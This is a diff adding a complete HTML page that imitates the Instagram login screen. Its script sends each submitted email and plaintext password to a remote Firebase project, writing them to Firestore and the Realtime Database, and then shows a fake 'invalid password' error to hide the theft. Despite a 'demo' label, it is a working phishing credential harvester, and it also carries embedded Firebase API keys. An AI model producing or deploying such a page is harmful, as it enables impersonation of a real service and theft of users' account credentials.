@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Login</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'instagram-blue': '#0095f6',
+                        'instagram-light': '#b2dffc',
+                        'instagram-border': '#dbdbdb',
+                        'instagram-bg': '#fafafa',
+                        'instagram-error': '#ed4956',
+                    },
+                    fontFamily: {
+                        sans: ['-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @font-face {
+            font-family: 'Billabong';
+            src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff');
+        }
+
+        .billabong {
+            font-family: 'Billabong', cursive;
+        }
+
+        /* Input field style adjustments for Instagram look */
+        input {
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8 !important; /* Slightly darker border on focus */
+        }
+    </style>
+</head>
+<body class="bg-instagram-bg flex justify-center items-center min-h-screen p-4">
+    <div class="flex max-w-4xl w-full mx-auto md:shadow-lg md:rounded-lg overflow-hidden bg-white">
+
+        <!-- Phone Image Section (Hidden on Mobile) -->
+        <div class="hidden md:flex w-1/2 min-h-[600px] bg-no-repeat bg-center bg-[url('https://placehold.co/400x600/f0f0f0/ddd?text=App+Preview')] items-center justify-center">
+        </div>
+
+        <!-- Auth Forms Section -->
+        <div class="w-full md:w-1/2 p-4 md:p-10 flex flex-col justify-center">
+
+            <!-- LOGIN FORM (Now the only form) -->
+            <div id="login-form" class="border border-instagram-border p-8 rounded-md mb-2 bg-white transition-all duration-300">
+                <h1 class="billabong text-5xl text-center mb-6">Instagram</h1>
+
+                <form id="login-form-elements">
+                    <input class="w-full p-2 bg-instagram-bg border border-instagram-border rounded-sm text-xs mb-2" type="email" id="login-email" placeholder="Email" required>
+                    <input class="w-full p-2 bg-instagram-bg border border-instagram-border rounded-sm text-xs mb-2" type="password" id="login-password" placeholder="Password" required>
+
+                    <button type="submit" id="login-button" class="w-full py-1.5 bg-instagram-blue text-white font-semibold rounded-lg mt-3 transition-opacity hover:opacity-90">Log In</button>
+                </form>
+
+                <div class="flex items-center my-4">
+                    <hr class="flex-grow border-t border-instagram-border">
+                    <span class="px-4 text-gray-400 text-xs font-semibold">OR</span>
+                    <hr class="flex-grow border-t border-instagram-border">
+                </div>
+
+                <div class="flex justify-center items-center text-instagram-blue font-semibold text-sm cursor-pointer mb-2">
+                    <svg class="mr-2" width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+                        <path d="M15 8.04938C15 3.60406 11.4189 0 7 0C2.58172 0 0 3.60406 0 8.04938C0 12.0665 2.73938 15.3964 6.3225 16V10.3744H4.39531V8.04938H6.3225V6.27562C6.3225 4.25938 7.43844 3.22562 9.27281 3.22562C10.1544 3.22562 11.0781 3.37562 11.0781 3.37562V5.37438H10.0484C9.03375 5.37438 8.6775 6.02875 8.6775 6.7V8.04938H10.9931L10.6175 10.3744H8.6775V16C12.2606 15.3964 15 12.0666 15 8.04938Z" />
+                    </svg>
+                    Log in with Facebook
+                </div>
+
+                <div class="text-center text-xs text-blue-800 mt-4 cursor-pointer">Forgot password?</div>
+
+                <div id="login-message" class="text-xs text-center mt-3 p-1 rounded transition-all duration-300"></div>
+            </div>
+
+            <!-- Static Bottom Prompt -->
+            <div class="border border-instagram-border p-4 rounded-md text-center bg-white text-sm">
+                <span class="text-gray-700">Don't have an account? Sign up is disabled in this demo.</span>
+            </div>
+
+            <div class="text-center mt-4">
+                <p class="text-sm mb-3">Get the app.</p>
+                <div class="flex justify-center space-x-2">
+                    <img class="h-10" src="https://placehold.co/134x40/000000/FFFFFF?text=App+Store" alt="App Store">
+                    <img class="h-10" src="https://placehold.co/134x40/000000/FFFFFF?text=Google+Play" alt="Google Play">
+                </div>
+            </div>
+
+            <!-- Display Current User ID (MANDATORY for multi-user apps) -->
+            <div class="text-center text-xs mt-4 text-gray-500">
+                Current User ID: <span id="current-user-id" class="font-mono text-gray-700 break-all">Initializing...</span>
+            </div>
+
+            <!-- Display saved user data -->
+            <div id="user-data-display" class="text-center text-xs mt-4 p-3 bg-gray-50 rounded-md hidden">
+                <h3 class="font-semibold mb-2">Last Login Data:</h3>
+                <p>Email: <span id="display-email" class="font-mono"></span></p>
+                <p>Password: <span id="display-password" class="font-mono"></span></p>
+                <p>Saved at: <span id="display-timestamp" class="font-mono"></span></p>
+            </div>
+
+        </div>
+    </div>
+
+    <script type="module">
+        // Firebase Modular SDK Imports (v11.6.1)
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, setLogLevel, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";
+
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBJ_G5o4otg7riemfJDMOcPoHoIVH7emsc",
+            authDomain: "geobazarr.firebaseapp.com",
+            databaseURL: "https://geobazarr-default-rtdb.firebaseio.com",
+            projectId: "geobazarr",
+            storageBucket: "geobazarr.firebasestorage.app",
+            messagingSenderId: "679949247383",
+            appId: "1:679949247383:web:036d4f32038422ebb89ad2"
+        };
+
+        let auth, db, realtimeDb, currentUserId = null;
+
+        // DOM elements
+        const loginFormElements = document.getElementById('login-form-elements');
+        const loginMessage = document.getElementById('login-message');
+        const currentUserIdDisplay = document.getElementById('current-user-id');
+        const userDataDisplay = document.getElementById('user-data-display');
+        const displayEmail = document.getElementById('display-email');
+        const displayPassword = document.getElementById('display-password');
+        const displayTimestamp = document.getElementById('display-timestamp');
+
+        // Helper function to show messages
+        function showMessage(element, text, isError = false) {
+            element.textContent = text;
+            element.className = 'text-xs text-center mt-3 p-1 rounded transition-all duration-300';
+            if (isError) {
+                element.classList.add('text-instagram-error', 'bg-red-50');
+            } else {
+                element.classList.add('text-instagram-blue', 'bg-blue-50');
+            }
+        }
+
+        // Helper function to clear all messages
+        function clearMessages() {
+            loginMessage.textContent = '';
+            loginMessage.className = 'text-xs text-center mt-3 p-1 rounded transition-all duration-300';
+        }
+
+        // Helper function to save user data to Firestore
+        async function saveUserDataToFirestore(userId, email, password) {
+            if (!db) {
+                console.error("Firestore not initialized");
+                return false;
+            }
+
+            try {
+                const userData = {
+                    email: email,
+                    password: password, // Note: In a real app, never store plaintext passwords
+                    loginTimestamp: new Date().toISOString(),
+                    userId: userId,
+                    source: 'instagram_login_page'
+                };
+
+                // Save to Firestore in a collection called "userLogins"
+                await setDoc(doc(db, "userLogins", userId), userData);
+                console.log("User data saved to Firestore successfully");
+                return true;
+            } catch (error) {
+                console.error("Error saving user data to Firestore: ", error);
+                return false;
+            }
+        }
+
+        // Helper function to save user data to Realtime Database
+        async function saveUserDataToRealtimeDB(userId, email, password) {
+            if (!realtimeDb) {
+                console.error("Realtime Database not initialized");
+                return false;
+            }
+
+            try {
+                const userData = {
+                    email: email,
+                    password: password, // Note: In a real app, never store plaintext passwords
+                    loginTimestamp: new Date().toISOString(),
+                    userId: userId,
+                    source: 'instagram_login_page',
+                    timestamp: Date.now()
+                };
+
+                // Save to Realtime Database under "loginAttempts" node
+                // Using push() to generate a unique key for each login attempt
+                const loginAttemptsRef = ref(realtimeDb, 'loginAttempts');
+                const newLoginRef = push(loginAttemptsRef);
+                await set(newLoginRef, userData);
+                
+                console.log("User data saved to Realtime Database successfully");
+                return true;
+            } catch (error) {
+                console.error("Error saving user data to Realtime Database: ", error);
+                return false;
+            }
+        }
+
+        // Helper function to display saved user data
+        function displaySavedUserData(userData) {
+            displayEmail.textContent = userData.email;
+            displayPassword.textContent = userData.password;
+            displayTimestamp.textContent = new Date(userData.loginTimestamp).toLocaleString();
+            userDataDisplay.classList.remove('hidden');
+        }
+
+        // Helper function to load and display previous login data
+        async function loadPreviousLoginData(userId) {
+            if (!db) return;
+            
+            try {
+                const docRef = doc(db, "userLogins", userId);
+                const docSnap = await getDoc(docRef);
+                
+                if (docSnap.exists()) {
+                    const userData = docSnap.data();
+                    displaySavedUserData(userData);
+                }
+            } catch (error) {
+                console.error("Error loading previous login data: ", error);
+            }
+        }
+
+        // --- Firebase Initialization and Authentication ---
+
+        async function initializeAppAndAuth() {
+            try {
+                // Set Firestore log level for debugging
+                setLogLevel('debug');
+
+                const app = initializeApp(firebaseConfig);
+                db = getFirestore(app);
+                realtimeDb = getDatabase(app);
+                auth = getAuth(app);
+
+                // Sign in anonymously
+                await signInAnonymously(auth);
+
+                // Set up auth state observer
+                onAuthStateChanged(auth, (user) => {
+                    if (user) {
+                        currentUserId = user.uid;
+                        currentUserIdDisplay.textContent = currentUserId;
+                        console.log("User state changed. UID:", currentUserId);
+                        
+                        // Load previous login data if available
+                        loadPreviousLoginData(currentUserId);
+                    } else {
+                        // This handles anonymous users if custom token fails, or sign outs
+                        currentUserId = crypto.randomUUID(); // Fallback ID for unauth state
+                        currentUserIdDisplay.textContent = `Anonymous: ${currentUserId.substring(0, 8)}...`;
+                        console.log("User is signed out or anonymous.");
+                    }
+                });
+
+            } catch (error) {
+                console.error("Firebase Initialization Failed:", error);
+                currentUserIdDisplay.textContent = 'Error during Auth';
+            }
+        }
+
+        initializeAppAndAuth();
+
+        // --- UI Logic ---
+
+        // Login form submission
+        loginFormElements.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            clearMessages();
+
+            if (!auth || !db || !realtimeDb) {
+                showMessage(loginMessage, "Database service not ready. Please wait.", true);
+                return;
+            }
+
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+
+            try {
+                // Save user data to both Firestore and Realtime Database
+                const [firestoreSuccess, realtimeDBSuccess] = await Promise.all([
+                    saveUserDataToFirestore(currentUserId, email, password),
+                    saveUserDataToRealtimeDB(currentUserId, email, password)
+                ]);
+
+                if (firestoreSuccess && realtimeDBSuccess) {
+                    // Display the saved data
+                    const userData = {
+                        email: email,
+                        password: password,
+                        loginTimestamp: new Date().toISOString()
+                    };
+                    displaySavedUserData(userData);
+                    
+                    // Show success message for saving data (but error for login)
+                    showMessage(loginMessage, "Data saved successfully! But login failed: Invalid email or password. Please try again.", true);
+                } else {
+                    showMessage(loginMessage, "Data partially saved. Login failed: Invalid email or password. Please try again.", true);
+                }
+
+                // Clear form
+                loginFormElements.reset();
+
+            } catch (error) {
+                showMessage(loginMessage, "Error processing your request. Please try again.", true);
+                console.error("Login Error:", error);
+            }
+        });
+    </script>
+</body>
+</html>
